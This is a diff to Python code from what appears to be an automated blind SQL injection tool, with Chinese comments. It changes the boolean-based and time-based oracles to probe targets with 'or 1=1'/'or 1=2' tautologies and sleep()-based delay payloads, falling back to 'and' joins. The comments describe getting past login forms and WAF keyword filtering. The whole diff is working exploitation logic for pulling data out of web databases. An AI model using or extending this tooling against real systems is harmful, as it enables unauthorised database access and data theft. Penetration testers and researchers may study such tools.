@@ -128,15 +128,21 @@ class BoolOracle(BaseOracle):
     def __init__(self, *a, workers: int = 6, **kw):
         super().__init__(*a, **kw)
         self.workers = workers
-        pre = self.inj.base_value if self.inj.numeric else self.inj.base_value + self.inj.closure
-        tail = self.inj.comment if self.inj.comment != "quote-close" else ""
-        self.R_true = self.s.request_value(f"{pre} and 1=1{tail}")
-        self.R_false = self.s.request_value(f"{pre} and 1=2{tail}")
+        # or 参照优先：登录框恒真=成功页、查询框恒真=多行页，通吃两种语义
+        self.R_true = self.s.request_value(self.b.wrap(self.b.logic_or("1=1")))
+        self.R_false = self.s.request_value(self.b.wrap(self.b.logic_or("1=2")))
+        self._joiner = "or"
         if similarity(self.R_true, self.R_false) > 0.995:
-            raise OracleError("真假页面无差异，布尔通道不可用")
+            # or 无差异（被过滤或恒真恒假同页）→ and 参照
+            self.R_true = self.s.request_value(self.b.wrap(self.b.logic_and("1=1")))
+            self.R_false = self.s.request_value(self.b.wrap(self.b.logic_and("1=2")))
+            self._joiner = "and"
+            if similarity(self.R_true, self.R_false) > 0.995:
+                raise OracleError("真假页面无差异，布尔通道不可用")
 
     def eval_bool(self, cond: str) -> bool:
-        payload = self.b.wrap(self.b.logic_and(cond))
+        join = self.b.logic_or if self._joiner == "or" else self.b.logic_and
+        payload = self.b.wrap(join(cond))
         r = self.s.request_value(payload)
         self.requests += 1
         if r.status_code < 0:
@@ -187,15 +193,22 @@ class TimeOracle(BaseOracle):
         self.delay = delay
         if self.waf.is_filtered("sleep"):
             raise OracleError("sleep 被过滤，时间通道不可用")
-        if self.waf.is_filtered("if") and self.waf.is_filtered("and"):
-            raise OracleError("if 与 and 均被过滤，时间通道不可用")
+        # joiner 自适应：or 恒真（登录框 and 会因密码恒假短路导致 sleep 不执行）
+        self._joiner = "or"
+        r = self.s.request_value(self.b.wrap(self.b.logic_or(f"sleep({delay})")))
+        if r.elapsed_ms < self.delay * 1000 * 0.75:
+            self._joiner = "and"
+            r = self.s.request_value(self.b.wrap(self.b.logic_and(f"sleep({delay})")))
+            if r.elapsed_ms < self.delay * 1000 * 0.75 and not self.waf.is_filtered("if"):
+                raise OracleError("or/and 均无法触发延时，时间通道不可用")
 
     def eval_bool(self, cond: str) -> bool:
+        join = self.b.logic_or if self._joiner == "or" else self.b.logic_and
         if not self.waf.is_filtered("if"):
-            core = f"if(({cond}),sleep({self.delay}),0)"
+            core = join(f"if(({cond}),sleep({self.delay}),0)")
         else:
-            core = f"sleep({self.delay}*({cond}))"
-        payload = self.b.wrap(self.b.logic_and(core))
+            core = join(f"sleep({self.delay}*({cond}))")
+        payload = self.b.wrap(core)
         r = self.s.request_value(payload)
         self.requests += 1
         if r.status_code < 0:
